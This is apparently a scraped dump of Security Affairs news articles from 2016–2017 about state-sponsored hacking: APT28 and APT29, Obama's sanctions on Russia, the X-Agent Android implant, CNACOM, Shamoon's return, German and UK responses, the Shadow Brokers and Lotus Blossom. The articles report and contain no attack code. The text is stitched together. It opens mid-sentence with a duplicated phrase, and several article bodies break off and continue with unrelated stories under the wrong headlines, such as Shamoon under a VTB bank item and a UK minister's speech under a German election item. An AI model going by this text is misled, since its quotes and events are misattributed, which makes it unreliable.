PaloAlto Network that is full of details on the reading the report published by PaloAlto Network that is full of details on the DustySky attacks and other information on the Gaza Cybergang.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Gaza cybergang,  cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dustysky-campaign", "topic_name": "DustySky campaign"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gaza-cybergang", "topic_name": "Gaza cybergang"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gaza-hackers-team", "topic_name": "Gaza Hackers Team"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/quasarrat", "topic_name": "QuasarRAT"}]}, {"news_name": "A sophisticated spear phishing campaign is targeting NATO Governments", "news_link": "https://securityaffairs.co/wordpress/55819/intelligence/nato-governments-attacks.html", "title": "A sophisticated spear phishing campaign is targeting NATO Governments\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 30, 2017", "body": "Security experts at Cisco Talos are warning of a new sophisticated espionage campaign targeting NATO Governments with specially designed documents used to deliver Flash exploits.

Trump is expressing skepticism about intelligence assessments of the Russian hacking and the Kremlin\u2019s interference in the election.\n\n\n\nAccording to the NYT, speaking to reporters outside his Palm Beach, Fla., club, Mar-a-Lago on Saturday evening, he revealed to know of  \u201cthings that other people don\u2019t know\u201d about the alleged hacking campaigns that targeted Presidential Election. Trump announced that he will share the information \u201con Tuesday or Wednesday.\u201d\n\n\u201cI just want them to be sure because it\u2019s a pretty serious charge,\u201d said Mr. Trump.\u201cIf you look at the weapons of mass destruction, that was a disaster, and they were wrong,\u201d he added, referring to intelligence cited by the George W. Bush administration to support its march to war in 2003. \u201cSo I want them to be sure,\u201d the president-elect said. \u201cI think it\u2019s unfair if they don\u2019t know.\u201d\n\n\u201cIf you look at the weapons of mass destruction, that was a disaster, and they were wrong,\u201d he added, referring to intelligence reports that were provided the George W.

And hacking is a very hard thing to prove. So it could be somebody else. And I also know things that other people don\u2019t know, and so they cannot be sure of the situation.\u201d\n\n\u201cI don\u2019t care what they say, no computer is safe,\u201d he added. \u201cI have a boy who\u2019s 10 years old; he can do anything with a computer.

The code was shared with executives from multiple industries in the US allowing the experts at Burlington Electric in Vermont to discover the intrusion.\n\n\u201cA code associated with the Russian hacking operation dubbed Grizzly Steppe by the Obama administration has been detected within the system of a Vermont utility, according to U.S. officials.\u201d states the report published by the Washington Post.\n\n\u201cBurlington Electric said in a statement that the company detected a malware code used in the Grizzly Steppe operation in a laptop that was not connected to the organization\u2019s grid systems. The firm said it took immediate action to isolate the laptop and alert federal authorities.\u201d\n\nThe malicious code was spotted during a scan of a company laptop that was anyway not connected to the grid.

This is the first time that the JAR attributes a malicious cyber activity to specific countries or threat actors.\n\n\u201cIn foreign countries, RIS actors conducted damaging and/or disruptive cyber-attacks, including attacks on critical infrastructure networks. In some cases, RIS actors masqueraded as third parties, hiding behind false online personas designed to cause the victim to misattribute the source of the attack. This JAR provides technical indicators related to many of these operations, recommended mitigations, suggested actions to take in response to the indicators provided, and information on how to report such incidents to the U.S. Government.\u201d States the report.\n\nDespite the vast majority of information reported in the JAR were known to the experts I invite you to focus on the first statement of the above excerpt, because according to the President Obama\u2019 executive order issued in April 2015, an attack against critical infrastructure can trigger an unpredictable cyber response of the US Government.\n\nThe JAR reports the activity of two different RIS actors, the APT28 and the APT29, that participated in the cyber attacks on a US political party. The APT29 known as (Cozy Bear, Office Monkeys, CozyCar, The Dukes and CozyDuke) broke into the party\u2019s systems in summer 2015. The APT28 known as (Fancy Bear, Pawn Storm, Sofacy Group, Sednit and STRONTIUM) entered in spring 2016.\n\nBoth groups and their activities were well known to security firms and intelligence agencies due to their cyber espionage campaigns that targeted organizations and companies worldwide.\n\nThe nation-state actors conducted numerous attacks leveraging spear phishing messages containing web links to a malicious dropper, also APT28 group relied heavily on shortened URLs in their spearphishing email campaigns. These take advantage of neutral space for setting up operational infrastructure to obfuscate their source infrastructure.\n\n\u201cAPT29 has been observed crafting targeted spearphishing campaigns leveraging web links to a malicious dropper; once executed, the code delivers Remote Access Tools (RATs) and evades detection using a range of techniques. APT28 is known for leveraging domains that closely mimic those of targeted organizations and tricking potential victims into entering legitimate credentials\u201d reads the JAR. \u201cOnce APT28 and APT29 have access to victims, both groups exfiltrate and analyze information to gain intelligence value. These groups use this information to craft highly targeted spearphishing campaigns. These actors set up operational infrastructure to obfuscate their source infrastructure, host domains and malware for targeting organizations, establish command and control nodes, and harvest credentials and other valuable information from their targets,\u201d\n\nGovernment experts explained both groups used multiple malware in their campaigns, including the XTunnel malware, the Fysbis backdoor, the Komplex Trojan, the Carberp malware.\n\nExperts observed two waves of attacks against US targets starting in the summer of 2015 and in November 2016.\n\nAccording to the FBI-DHS JAR report, nation-state hackers designated as Grizzly Steppe targeted more than US recipients in  April 2015 as part of a spear phishing campaign.\n\n\u201cIn summer 2015, an APT29 spearphishing campaign directed emails containing a malicious link to over 1,000 recipients, including multiple U.S. Government victims. APT29 used legitimate domains, to include domains associated with U.S. organizations and educational institutions, to host malware and send spearphishing emails.\u201d Continues the report.\n\nIn Spring 2016, hackers belonging to the APT28 hacker group, targeted the same political party via spear phishing email aimed to trick victims into changing their email credetianls. The hackers used a fake webmail domain hosted on operational infrastructure used by the APT28. Then APT28 used the stolen credentials to gain access target systems and exfiltrate sensitive information. The APT28 breached U.S. Democratic Congressional Campaign Committee (DCCC).\n\n\u201cIn the spring of 2016, attackers were again successful when they tricked a spear phishing recipient to change their password through a fake web domain controlled by the attackers. \u201cUsing the harvested credentials, APT28 was able to gain access and steal content, likely leading to the exfiltration of information from multiple senior party members.\u201d\u201d\n\nThe JAR report confirmed information stolen by hackers was released to the press and publicly disclosed in the attempt to interfere with Presidential Election. The report does not explicitly refers the DNC, but almost any security firm that analyzed the attack confirmed that the DNC was the primary target of the Russian hackers.\n\n\n\n\u201cActors likely associated with RIS are continuing to engage in spearphishing campaigns, including one launched as recently as November 2016, just days after the U.S. election\u201d\n\nThe JAR report also include a Recommended Mitigations section with best practices and mitigation strategies to improve cyber security posture of organizations.\n\n\u201cDHS encourages network administrators to implement the recommendations below, which can prevent as many as 85 percent of targeted cyber-attacks. \u201d states the report.\n\nAbout the Authors:\n\n Pierluigi Paganini and @GranetMan\n\nGranet is a young and Junior IT Security Researcher, he is passionate in Linux, Arduino, Digital Forensics, Cyber Security, Free software and Malware Analysis\n\n \n\n \n\n(Security Affairs \u2013 APT28, APT29, JAR Report)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt28", "topic_name": "APT28"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/apt29", "topic_name": "APT29"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/grizzly-steppe", "topic_name": "GRIZZLY STEPPE"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/presidential-election", "topic_name": "presidential election"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ris", "topic_name": "RIS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russian-civilian-and-military-intelligence-services", "topic_name": "Russian civilian and military intelligence Services"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}]}, {"news_name": "President Obama executive order ejected 35 Russians out of US", "news_link": "https://securityaffairs.co/wordpress/54872/intelligence/obama-executive-order.html", "title": "President Obama executive order ejected 35 Russians out of US\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 30, 2016", "body": "President Barack Obama issued an executive order to impose sanctions on a number of Russian military and intelligence officials in response to the alleged hacking campaigns against the 2016 US Presidential Election.\n\nThe US ejected 35 Russian intelligence operatives from the United States and imposed sanctions on nine entities and individuals.\n\nThe Russians individuals ejected by the US Government are working out of the Russia\u2019s consulate in San Francisco and the Russian embassy in Washington.\n\nAccording to a White House fact sheet issued on the executive order, the individuals due to the \u201charassment of our diplomatic personnel in Russia by security personnel and police.\u201d\n\nThe US Government sanctioned the Russian intelligence services, the GRU (Russian Main Intelligence Directorate) and the FSB (Federal Security Service), four GRU officers, and three other organizations.

Since the Stuxnet against the Natanz nuclear plant, something has changed permanently and dual-hat arrangement is considered no more effective for the US cyber strategy.\n\n\u201cWhile the dual-hat arrangement was once appropriate in order to enable a fledgling Cybercom to leverage NSA\u2019s advanced capabilities and expertise, Cybercom has since matured.\u201d to the point where it needs its own leader, Obama said in a statement accompanying his signing of the 2017 defense authorization bill.\n\nObama believes that the Cybercom urges its own leader, he confirmed it in a statement accompanying his signing of the 2017 defense authorization bill.\n\n\u201cThe two organizations should have separate leaders who are able to devote themselves to each organization\u2019s respective mission and responsibilities, but should continue to leverage the shared capabilities and synergies developed under the dual-hat arrangement,\u201d Obama wrote about the dual-hat arrangement.\n\nThe Obama decision to separate the heads of the two organizations was supported by the Defense Secretary Ashton B. Carter and Director of National Intelligence James R. Clapper Jr.,\n\nThe idea of separating the heads of the two organizations is not new, President Obama proposed it back in 2013.\n\n\u201cObama had been on the verge of ending the dual-hat leadership in late 2013 but was persuaded to hold off when senior officials, including the NSA\u2019s director at the time, Army Gen.

Late in the summer of 2016, researchers from CrowdStrike Intelligence began investigating a curious Android Package (APK) named \u2018\u041f\u043e\u043f\u0440-\u041430.apk\u2019 (MD5: 6f7523d3019fa190499f327211e01fcb). The APK contains a number of Russian language artifacts that were military in nature.  Hackers used an implant for a legitimate app, but there is no evidence the application was made available in the Android app store.\n\n\u201cFrom late 2014 and through 2016, FANCY BEAR X-Agent implant was covertly distributed on Ukrainian military forums within a legitimate Android application developed by Ukrainian artillery officer Yaroslav Sherstuk.\u201d states the report published by Crowdstrike. \u201cThe original application enabled artillery forces to more rapidly process targeting data for the Soviet-era D-30 Howitzer employed by Ukrainian artillery forces reducing targeting time from minutes to under 15 seconds.

This represents the highest percentage of loss of any other Ukrainian artillery units.\n\nOne aspect very interesting of the story is the implant, an unseen variant of the X-Agent.

APT 28 successfully exfiltrated data from the German Bundestag in 2015.\u201d\n\nIn March security experts at Trend Micro, who follow a long time the operations of the Russian-linked Pawn Storm cyber spies (aka APT 28, Sednit, Sofacy, Fancy Bear and Tsar Team) discovered that the Russian spies targeted the political party of Chancellor Angela Merkel, the Christian Democratic Union.\n\nSome experts speculate that also the recent attack against the Deutsche Telekom routers was powered is linked to Russia.\n\nThe German Parliament, the Bundestag, was targeted by hackers that also hit a number of German politicians, including the Chancellor Angela Merkel.\n\n\u201cSuch cyber-attacks, or hybrid conflicts as they are known in Russian doctrine, are now part of daily life and we must learn to cope with them.\u201d commented the Chancellor Angela Merkel.\n\n\u201cThere are findings that cyber-attacks take place which have no other meaning than to create political uncertainty. There is a kind of pressure on public discourse and on democracy, which is unacceptable.\u201dKahl told the S\u00fcddeutsche Zeitung, \u201cAttribution to a state actor is technically difficult, but there is some evidence that it is at least tolerated or desired by the state.\u201d \n\nThe German intelligence observed a rise in Russian online propaganda in Germani since the start of the Ukraine crisis.\n\n\u201cSince the start of the Ukraine crisis, we have seen a significant increase in Russian propaganda and disinformation campaigns in Germany.\u201d reads a statement issued by the BfV.\n\nThe German intelligence has explicitly blamed the APT28 as the threat actors behind the hacking campaign used for disinformation activities, the group appears to be specialized in false flag activities. Something similar occurred when Russian Hackers have broken into the French TV5 pretending to be an ISIS-linked group.\n\n\u201cThis approach represents a previously unseen methodology in campaigns that are controlled by Russia.\u201d \n\nAccording to Maassen, APT 28 activity is responsible for an unprecedented disinformation campaign.\n\n\u201cPropaganda, disinformation, cyber-attacks, cyber espionage and cyber sabotage are part of hybrid threats against western democracies.\u201d said Maassen warning of significant an increase in political cyber espionage.\u201d\n\n\u201cStolen information could be used in the election campaign to discredit German politicians.\u201d\n\nOn the other side, the Kremlin denies involvement and warns the US and asked Washington clarifications for US cyber threats.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Russia, APT 28 state-sponsored hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/christian-democratic-union", "topic_name": "Christian Democratic Union"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pawn-storm", "topic_name": "Pawn Storm"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sednit", "topic_name": "SEDNIT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spear-phishing", "topic_name": "spear phishing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trend-micro", "topic_name": "Trend Micro"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/watering-hole", "topic_name": "watering hole"}]}, {"news_name": "Chinese hackers behind the CNACOM campaign hit Taiwan website", "news_link": "https://securityaffairs.co/wordpress/54093/intelligence/cnacom-campaign.html", "title": "Chinese hackers behind the CNACOM campaign hit Taiwan website\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 6, 2016", "body": "Security researchers from the firm Zscaler have been monitoring a cyber espionage campaign dubbed \u2018CNACOM\u2018 that was targeting government organization in Taiwan. According to the researchers, the hackers behind the CNACOM campaign are linked to China and exploited an IE vulnerability, tracked as CVE-2016-0189, patched by Microsoft early 2016.\n\nThe CVE-2016-0189 had been exploited in targeted attacks against Windows users in South Korea before Microsoft fixed it.\n\nIn order to trigger the vulnerability, victims have to visit a compromised website or open a spear-phishing email containing a malicious link.\n\nThe threat actors used watering hole attacks to spread a malware, among the sites compromised by the hackers, there is a major public service organization in Taiwan.\n\nExperts from startup Theori have made a reverse engineering of the MS16-053 that fixed the CVE-2016-0189 flaw and published a PoC exploit for the vulnerability.\n\nThe PoC code works on Internet Explorer 11 running on Windows 10, a great gift for fraudsters that included it in the Neutrino EK as confirmed by FireEye.\n\nSince researchers released the full proof of concept for the CVE-2016-0189 flaw, experts at Zscaler ThreatLabZ have been closely tracking its proliferation.\n\nThe exploit code for the flaw was first spotted as part of the Sundown exploit kit (EK), later it was included in the Magnitude and the KaiXin EK.\n\n\u201cThis blog details CNACOM, a web-based campaign that appears to be related to a well-known nation-state actor more commonly associated with spear-phishing attacks.\u201d reads the analysis published by Zscaler. \u201cOn November 7, we spotted a malicious injection on the registration page of a major Taiwanese public service website. An iframe was injected into the footer of the page, which then loaded a unique landing page containing the CVE-2016-0189 exploit code.\u201d\n\n\n\n \n\nThe hackers behind the CNACOM campaign used the same PoC code, but they leveraged on another Internet Explorer privilege escalation flaw, tracked as CVE-2015-0016.\n\nThe experts highlighted that that CNACOM campaign specifically targeted Taiwanese government entities. The exploit code collects information from the device, including its IP address. If the victim uses the IE and the IP address belongs to the Taiwanese government, the exploit delivers a strain of the Ixeshe malware.\n\nThe Ixeshe malware has been around since at least 2009, in August 2013 security experts at FireEye observed a series of cyber attacks conducted by the Chinese APT group known as APT12 targeting the US media. The experts linked the threat actors to the campaign that targeted the New York Times in 2012.\n\nThe variant of Ixeshe malware used in the CNACOM campaign is different from older ones.\n\n\u201cUnlike many historical IXESHE samples, it appears that this variant doesn\u2019t utilize campaign codes embedded in the malware itself. This may be due to a more centralized tracking system that only relies on the malware reporting a machine ID.\u201d continues the analysis.\n\nGovernment agencies and private firms in Taiwan are often victims of cyber espionage likely launched by Chinese hackers, a few weeks ago the Tropic Trooper APT hit government Taiwanese organizations and companies in the energy sector.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Taiwan, CNACOM campaign)\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt12", "topic_name": "APT12"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cnacom", "topic_name": "CNACOM"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cve-2016-0189", "topic_name": "CVE-2016-0189"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}]}, {"news_name": "Another Russian Bank, the VTB bank, was hit by a cyber attack", "news_link": "https://securityaffairs.co/wordpress/54085/cyber-crime/vtb-bank-cyber-attack.html", "title": "Another Russian Bank, the VTB bank, was hit by a cyber attack\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 5, 2016", "body": "The Russian state-controlled bank VTB confirmed that its websites had been targeted by a cyber attack.

Among the victims, there was the petrol giant Saudi Aramco. The principal capability of Shamoon is a feature that allows it to wipe data from hard drives of the infected systems.\n\nIn the attack against Saudi Aramco Shamoon wipe data on over 30,000 computers and rewrite the hard drive MBR (Master Boot Record) with an image of a burning US flag.\n\nThe first team that discovered the malware was Kaspersky Lab that had analyzed some instances of the threat linked to the \u201cwiper agent\u201d due to the presence of a module of a string with a name that includes \u201cwiper\u201d as part of it.\n\nThe researcher of Seculert who analyzed Shamoon discovered that it has also the ability to overwrite the machine\u2019s MBR. Before Shamoon makes unusable the infected PC, it gathers data from the victim, it steals information, taking data from the \u2018Users\u2019, \u2018Documents and Settings\u2019, and \u2018System32/Drivers\u2019 and \u2018System32/Config\u2019 folders on Windows computers, and send them to another infected PC on the same internal network.\n\nThe malware was developed to destroy target systems, making the machine unusable. The malware was able to infect several OSs, including Windows 95, Windows 98, Windows XP, Windows 200, Windows Vista, Windows NT, Windows ME, Windows 7, Windows Server 2003, and Windows Server 2008.\n\nNow the threat is back, security experts detected it in a new wave of attacks. Experts from Palo Alto Networks and Symantec reported an attack a single Saudi company.\n\n\u201cWhy Shamoon has suddenly returned again after four years is unknown. However, with its highly destructive payload, it is clear that the attackers want their targets to sit up and take notice,\u201d reported Symantec.\n\n\u201cLast week, Unit 42 came across new Disttrack samples that appear to have been used in an updated attack campaign. The attack targeted at least one organization in Saudi Arabia, which aligns with the targeting of the initial Shamoon attacks. It appears the purpose of the new Disttrack samples were solely focused on destruction, as the samples were configured with a non-operational C2 server to report to and were set to begin wiping data exactly on 2016/11/17 20:45. In another similarity to Shamoon, this is the end of the work week in Saudi Arabia (their work week is from Sunday to Thursdays), so the malware had potentially the entire weekend to spread.  The Shamoon attacks took place on Lailat al Qadr, the holiest night of the year for Muslims; another time the attackers could be reasonably certain employees would not be at work.\u201d reads an analysis published by Palo Alto Networks.\n\nThe new variant of Shamoon detected by the experts is able to rewrite the MBR on affected computers with an image of a three-year-old Syrian boy named Alan Kurdi that lay dead on a Turkish beach.\n\nAccording to Symantec, this is a carefully planned operation. The malware was configured with passwords that appear to have been stolen from the targeted organizations. Attackers used these credentials to rapidly spread the threat across the targeted organization\u2019s network. It is still unclear how the attackers obtained the credentials.\n\nThe malware comes with a default configuration, it launched the disk-wiping component at 8:45pm local time on Thursday, November 17. Considering that in Saudi Arabia the working week runs from Sunday to Thursday, the attacker tried to exploit the pause in order to maximize the effects of the attack.\n\n\u201cThe malware had a default configuration that triggered the disk-wiping payload at 8:45pm local time on Thursday, November 17. The Saudi Arabian working week runs from Sunday to Thursday. It would appear that the attack was timed to occur after most staff had gone home for the weekend in the hope of reducing the chance of discovery before maximum damage could be caused.\u201d wrote Symantec.\n\nThe attack was planned to start on Laylat al Qadr (Night of Decree) that is a Muslim holiday.\n\n\n\nThe analysis of the malware revealed that is was almost identical to the one used in the 2012 attacks.\n\nIts infrastructure is composed of three components, a dropper, a wiper, and a module for communications that assured the attackers to remotely control the malware.\n\nIn the recent attack, the component for the remote communications was configured with the IP 1.1.1.1, that didn\u2019t host the Shamoon C&C server. This circumstance suggests that attackers plan did not include the possibility of changing the treat.\n\nAccording to PaloAlto Networks, from a functionality standpoint, the wiper is powered by EldoS RawDisk driver utility that is able to overwrite files on the system without any interaction with the OS.\n\nExperts believe that the group behind this last attack is the responsible for the 2012 hack too, for example, the researchers noticed that the EldoS RawDisk driver altered the infected host\u2019s system time to August 2012, just a day before the expiration date for the driver\u2019s temporary license. The license was the same used in the 2012 attacks.\n\n\u201cThe current attack campaign has several TTP overlaps with the original Shamoon campaign, especially from a targeting and timing perspective. Also, Disttrack malware used in the recent attacks is very similar to the variant used in the 2012 attacks, which uses the exact same RawDisk device driver as well (down to the same, temporary license key).. The main purpose of the Disttrack malware is to overwrite files and storage partitions in an attempt to destroy data and render the system unusable. To maximize its destruction, the Disttrack tool attempts to spread to other systems on the network using stolen administrator credentials, which suggests that the threat actors had previous access to the network or carried out successful phishing attacks prior to the attack using Disttrack.\u201dstates PaloAlto Networks.\n\nGive a look at the report that includes also IoC for the last Shamoon attack.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Shamoon, malware)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/saudi-arabia", "topic_name": "Saudi Arabia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/shamoon", "topic_name": "Shamoon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/wiper", "topic_name": "Wiper"}]}, {"news_name": "Hacking \u2013 German politicians fear Russian interference in the next election", "news_link": "https://securityaffairs.co/wordpress/53914/intelligence/russian-interference-german-gov.html", "title": "Hacking \u2013 German politicians fear Russian interference in the next election\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 30, 2016", "body": "During the weekend an improved version of the Mirai Botnet caused serious connectivity problems to at least 900,000 routers of the Deutsche Telekom.\n\nJust after the attack, some experts speculated the involvement of Russian hackers behind the botnet that powered it.\n\nThe Government of Berlin fears possible interference of Russian nation-state hackers with the 2017 German election.\n\nThe attack demonstrated once again how much vulnerable it modern society to cyber threats, which then can also interfere with a political election.

And the Telekom hack is by no means the only attack of its kind in Germany.\u201d reported DW.com.\n\nIn the past German infrastructure were targeted several times by foreign hackers. In June 2015, the German Government announced that hackers who breached the Bundestagsystems in May have also stolen data from targeted network. A spokeswoman for the Bundestag confirmed that unknown hackers stole data during the cyber attack, the investigators have uncovered several data leaks.\n\nThe daily Der Spiegel speculated that the Russian Government was involved in the attack occurred in May 2015.  The news agency reported the opinion government representatives close to the Bundestag\u2019s tech department.\n\n\u201cBehind the Cyber attack on the data network of the German Bundestag experts suspect Russian professional hackers. The SPIEGEL ONLINE learned from multiple sources familiar with the case. Thus, the German security authorities are now available clear indications that an authorship Russian cyber spies \u2013 point \u2013 perhaps a secret.\u201d states the Der Spiegel website.\n\nThe attackers, likely Russian state-sponsored hackers, used a sophisticated strain of malware to violate the Bundestag network and syphon sensitive data. The experts that analyzed the malicious have found it similar to the malware used in a previous attack against on a German Government network occurred in 2014.\n\nGerman intelligence is aware of cyber espionage campaigns against its political leaders.\n\n\u201cWe have indications that hacker groups from Russia are active in this area, but we also know what foreign intelligence services are capable of,\u201d Social Democratic Bundestag deputy Lars Klingbeil told Deutsche Welle. \u201cFor me this shows that we really need to protect ourselves structurally.

Hammond explained that hack back is the unique alternative to a conflict.\n\n\u201cSpeaking before the launch, Hammond said Britain must \u201ckeep up with the scale and pace of the threats we face\u201d and insisted that the new funding will \u201callow us to take even greater steps to defend ourselves in cyberspace and to strike back when we are attacked\u201d.\u201d reported The Guardian\n\n\u201cThe money \u2013 which almost doubles the amount set out for a similar strategy in 2011 \u2013 will be used to improve automated defences to safeguard citizens and businesses, support the cybersecurity industry and deter attacks from criminals and \u201chostile actors\u201d.\u201d\n\nHammond announced a new posture of the UK against the cyber threats, with a specific focus on the protection of the nation\u2019s critical national infrastructure and business.\n\n\u201cWe will deter those who seek to steal from us, or harm our interests,\u201d Hammond told at the Microsoft\u2019s Future Decoded conference in London on Tuesday. \u201cWe will strengthen law enforcement to raise cost and reduce rewards,\u201d he said of criminal attackers.\n\nThis is just first step ahead in cyber security matter, he promised the UK would \u201ccontinue to invest in cyber defense capabilities,\u201d in particular in the technology that could allow the British cyber army to trace and hack back the state-sponsored hackers.\n\n\u201cIf we don\u2019t have the ability to respond in cyberspace to attack that takes down power networks or air traffic control systems we would be left with the impossible choice of turning the other cheek or resorting to a military response \u2013 that\u2019s a choice we don\u2019t want to face.\u201d\n\n\u201cNo doubt the precursor to any state-on-state conflict would be a campaign of escalating cyber attack. We will not only defend ourselves in cyberspace but will strike back in kind when attacked.\u201d\n\nIn the same day, Hammond, who chairs the Cabinet\u2019s cross-department cyber-security committee, had listed high-profile cyber attacks against British critical infrastructure.\n\nThe active defence model implemented by the UK Government includes a new generation software to detect and repel cyber attacks and also the creation of dedicated cyber units.\n\nHammond pointed to the recent deployment of an application that was able to zero incidence of 50,000 fraudulent emails from crooks that pretend to be sent from Government offices.\n\nHammond also referenced the TalkTalk data breach that exposed details of 156,959 customers and that lead the Information Commissioner to fine the company \u00a3400,000.\n\n\u201cCEOs and boards must recognise they have responsibility to manage cybersecurity,\u201d Hammond said.\n\nHammond stressed the adoption of a proper security posture also for private businesses that are a privileged target of hackers.\n\n\u201cSimilarly, technology companies must take responsibility for incorporating the best possible security measures into the technology of their products. Getting this right will be crucial to keeping Britain at the forefront of digital security technology.\u201d \n\nNo doubts, the active defence is the new approach of many governments in response to the growing cyber threats.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Active Defence , UK)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/active-defence", "topic_name": "Active defence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking-back", "topic_name": "hacking back"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nation-state-hackers", "topic_name": "nation-state hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/philip-hammond", "topic_name": "Philip Hammond"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/uk", "topic_name": "UK"}]}, {"news_name": "NSA Hackers The Shadow Brokers leaked another dump with NSA targets", "news_link": "https://securityaffairs.co/wordpress/52928/cyber-warfare-2/shadowbrokers-leaked-nsa-targets.html", "title": "NSA Hackers The Shadow Brokers leaked another dump with NSA targets\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 31, 2016", "body": "The notorious Shadow Brokers hacker group has posted a fresh dump containing a list of servers that were hacked by the NSA-linked group known as Equation Group.\n\nThe hackers disclosed the list containing historic targets of the Equation Group, it includes Mail providers, Chinese targets, and universities.\n\nThe Equation group compromised the targets using the hacking tools codenamed as INTONATION and PITCHIMPAIR.\n\nThe latest dump leaked by the Shadow Brokers was signed using the same key used to sign the first dump of Equation Group exploits.\n\nThe ShadowBrokers provided the links to two distinct PGP-encrypted archives, the first one offered for free as a proof of the hack (its passphrase was \u2018auctioned\u2019), for the second one the group requested 1 million BTC .\n\nThe first archive contains roughly 300MBs of data, including firewall exploits, hacking tools, and scripts with cryptonyms like BANANAUSURPER, BLATSTING, and BUZZDIRECTION.\n\nThe security researchers Mustafa Al-Bassam has published an interesting post that lists all the exploits, implants, and tools for hacking firewalls (\u201cFirewall Operations\u201d) included in the dump.\n\nThe Equation Group \u2018s hackers targeted products made by Cisco, Fortigate, Juniper, TOPSEC, and Watchguard.\n\nThe majority of files are at least three years old, meanwhile, the newest timestamp dating to October 2013.\n\nEarly October, TheShadowBrokers complained that no one seems to be bidding on their precious archive, an alleged member of the hacker group expressed his dissent on the lack of interest in ponying up bitcoins to release the full NSA data dump.\n\nA couple of weeks ago the group announced the launch of a crowdfunding campaign for the stolen arsenal because its auction received offers for less than two bitcoins.\n\nBack to the present day, the ShadowBrokers hackers published message accompanying the latest dump.\n\n\u201cTheShadowBrokers is having special trick or treat for Amerikanskis tonight.\u201d \u201cWhy is DirtyGrandpa threating CIA cyberwar with Russia?

The experts speculated the involvement of state-sponsored hackers due to the nature of the stolen information.\n\n\u201cThe Esile targeted attack campaign targeting various countries in the Southeast Asian region has been discussed in the media recently. This campaign \u2013 which was referred to by other researchers as Lotus Blossom \u2013 is believed to be the work of a nation-state actor due to the nature of the stolen information, which is more valuable to countries than either private companies or cybercriminals.\u201d wrote Trend Micro.\n\nAccording to Trend Micro, other researchers have collected evidence that dates back to 2007 first activities of the group.\n\nBack to the present, the Lotus Blossom group launched a new espionage campaign using fake invitations to Palo Alto Networks\u2019 Cybersecurity Summit that will be held in  Jakarta, on November 3.\n\n\u201cActors related to the Operation Lotus Blossom campaign continue their attack campaigns in the Asia Pacific region. It appears that these threat actors have begun using Palo Alto Networks upcoming Cyber Security Summit hosted on November 3, 2016 in Jakarta, Indonesia as a lure to compromise targeted individuals.\u201d states the blog post published by Palo Alto Networks. \u201cThe payload installed in attacks using this lure is a variant of the Emissary Trojan that we have analyzed in the past, which has direct links to threat actors associated with Operation Lotus Blossom.\u201d\n\n\n\nThe security experts from Palo Alto Networks observed that cyberspies used the trick to deliver a new version of the Emissary Trojan.\n\nThe hackers powered a spear phishing campaign leveraging on emails with Word document attachments titled \u201c[FREE INVITATIONS] CyberSecurity Summit.doc.\u201d The document, which contains an image from a previous invitation, attempts to exploit the old Microsoft Office vulnerability tracked as CVE-2012-0158 to deliver the malicious payload.\n\n\u201cAs our readers and customers in Indonesia are likely recipients of this phishing e-mail, we want to release some key facts to clarify the 